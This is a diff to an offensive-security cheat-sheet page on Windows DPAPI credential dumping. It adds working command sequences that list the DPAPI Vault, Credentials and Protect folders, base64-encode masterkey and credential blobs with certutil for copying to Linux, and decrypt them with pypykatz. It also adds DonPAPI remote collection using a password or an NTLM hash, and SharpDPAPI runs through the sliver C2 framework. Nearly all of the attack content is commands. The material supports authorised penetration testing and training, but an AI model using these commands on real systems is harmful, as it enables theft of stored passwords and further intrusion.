@@ -4,23 +4,86 @@ date: 2024-7-31
 tags: ["Credential Dumping", "Mimikatz", "DPAPI", "Windows", "Password", "Donpapi"]
 ---
 
-### Abuse #1: Auto dump (From Linux)
+### Abuse #1: Credentials dump (From Linux)
 
-{{< tab set1 tab1 active >}}Linux{{< /tab >}}
+{{< tab set1 tab1  >}}pypykatz{{< /tab >}}
+{{< tab set1 tab2 >}}DonPAPI{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
+#### 1. Info Gathering
+
 ```console
+cmd /c "dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<USER>\AppData\Roaming\Microsoft\Protect"
+```
+
+#### 2. Retrieve Keys
+
+```console
+# Get master key
+certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY>" C:\ProgramData\<MASTERKEY>
+```
+
+```console
+# Copy and paste to local Linux
+type C:\ProgramData\<MASTERKEY>
+```
+
+```console
+# Base64 decode
+cat masterkey_b64 | base64 -d > masterkey_file
+```
+
+```console
+# Get credential
+certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>" C:\ProgramData\<CREDENTIALS_HASH>
+```
+
+```console
+# Copy and paste to local Linux
+type C:\ProgramData\<CREDENTIALS_HASH>
+```
+
+```console
+# Base64 decode
+cat credential_b64 | base64 -d > credential_file
+```
+
+#### 3. Decrypt credentials
+
+```console
+pypykatz dpapi prekey password <SID> '<PASSWORD>' | tee pkf
+```
+
+```console
+pypykatz dpapi masterkey masterkey_file pkf -o mkf
+```
+
+```console
+pypykatz dpapi credential mkf credential_file
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+```console
+# With password
 DonPAPI collect -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -t <TARGET>
+```
+
+```console
+# With hash
+DonPAPI collect -d <DOMAIN> -u '<USER>' -H <HASH> -t <TARGET>
 ```
 
 <small>*Ref: [DonPAPI](https://github.com/login-securite/DonPAPI)*</small>
 
 {{< /tabcontent >}}
 
-### Abuse #1: Auto dump (From Windows)
+### Abuse #1: Credentials dump (From Windows)
 
-{{< tab set2 tab1 active >}}mimikatz{{< /tab >}}
+{{< tab set2 tab1  >}}mimikatz{{< /tab >}}
 {{< tab set2 tab2 >}}SharpDPAPI{{< /tab >}}
+{{< tab set2 tab3 >}}sliver{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 #### 1. Info Gathering
@@ -574,12 +637,30 @@ SharpDPAPI completed in 00:00:00.1707869
 ```
 
 {{< /tabcontent >}}
+{{< tabcontent set2 tab3 >}}
+
+```console
+# Run as system
+sharpdpapi -- 'machinetriage'
+```
+
+```console
+# Run as user
+sharpdpapi -- 'credentials /password:<PASSWORD>'
+```
+
+```console
+# Run as user (without password)
+sharpdpapi -- 'credentials /rpc'
+```
+
+{{< /tabcontent >}}
 
 ---
 
 ### Abuse #2: Browser Saved Creds
 
-{{< tab set3 tab1 active >}}Offline{{< /tab >}}
+{{< tab set3 tab1 >}}Offline{{< /tab >}}
 {{< tab set3 tab2 >}}Auto{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
